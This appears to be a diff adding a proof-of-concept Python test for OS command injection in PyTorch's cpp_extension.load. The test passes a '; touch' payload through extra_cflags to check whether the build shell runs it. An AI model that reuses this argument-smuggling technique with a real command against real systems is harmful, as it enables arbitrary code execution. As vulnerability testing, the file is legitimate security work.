@@ -1,0 +1,96 @@
+```python
+import torch
+import os
+import tempfile
+import shutil
+from torch.utils.cpp_extension import load
+
+def test_load_command_injection():
+    """
+    Test case for OS command injection in torch.utils.cpp_extension.load.
+    
+    This test verifies if user-supplied input in 'extra_cflags' can lead to 
+    command execution when the underlying build process uses shell=True.
+    
+    The vulnerability allows an attacker to inject shell metacharacters (e.g., ;)
+    to execute arbitrary commands.
+    """
+    
+    # Setup temporary directories
+    build_dir = tempfile.mkdtemp()
+    src_dir = tempfile.mkdtemp()
+    
+    # Define a marker file to verify command execution
+    marker_file = "/tmp/torch_cpp_ext_injection_marker"
+    
+    # Clean up marker file if it exists from previous runs
+    if os.path.exists(marker_file):
+        os.remove(marker_file)
+
+    # Create a minimal valid C++ extension source file
+    # We need valid source to ensure the build process starts and attempts to execute the compiler
+    source_file = os.path.join(src_dir, "extension.cpp")
+    cpp_source = """
+    #include <torch/extension.h>
+    torch::Tensor add(torch::Tensor x, torch::Tensor y) {
+        return x + y;
+    }
+    PYBIND11_MODULE(TORCH_EXTENSION_NAME, m) {
+        m.def("add", &add, "Add two tensors");
+    }
+    """
+    
+    with open(source_file, "w") as f:
+        f.write(cpp_source)
+
+    # Construct the malicious payload.
+    # If the build system passes this to a shell (shell=True), the command after the semicolon will execute.
+    # We use a benign 'touch' command to create a file as proof of execution.
+    injection_payload = f"; touch {marker_file}"
+    
+    try:
+        # Call the similar API: torch.utils.cpp_extension.load
+        # We inject the payload via extra_cflags
+        print(f"Attempting to load extension with payload: '{injection_payload}'")
+        
+        module = load(
+            name="test_injection_module",
+            sources=[source_file],
+            extra_cflags=[injection_payload],
+            build_directory=build_dir,
+            verbose=True
+        )
+        
+        # Check if the marker file was created
+        if os.path.exists(marker_file):
+            print("SECURITY ISSUE DETECTED: Command injection successful! Marker file created.")
+            return True
+        else:
+            print("Test passed: No command injection detected.")
+            return False
+
+    except Exception as e:
+        # The compilation might fail because the injected syntax breaks the compiler argument list,
+        # but the shell command might have executed before the failure.
+        if os.path.exists(marker_file):
+            print(f"SECURITY ISSUE DETECTED: Command injection successful despite compilation error! Error: {e}")
+            return True
+        else:
+            print(f"Test failed/No injection detected. Error: {e}")
+            return False
+            
+    finally:
+        # Cleanup
+        shutil.rmtree(build_dir, ignore_errors=True)
+        shutil.rmtree(src_dir, ignore_errors=True)
+        if os.path.exists(marker_file):
+            os.remove(marker_file)
+
+if __name__ == "__main__":
+    # This test requires a PyTorch installation with C++ extensions enabled (usually requires CUDA or CPU cxx11 ABI)
+    # and a compiler (g++) available in the path.
+    try:
+        test_load_command_injection()
+    except ImportError:
+        print("PyTorch or cpp_extension utilities not available.")
+```
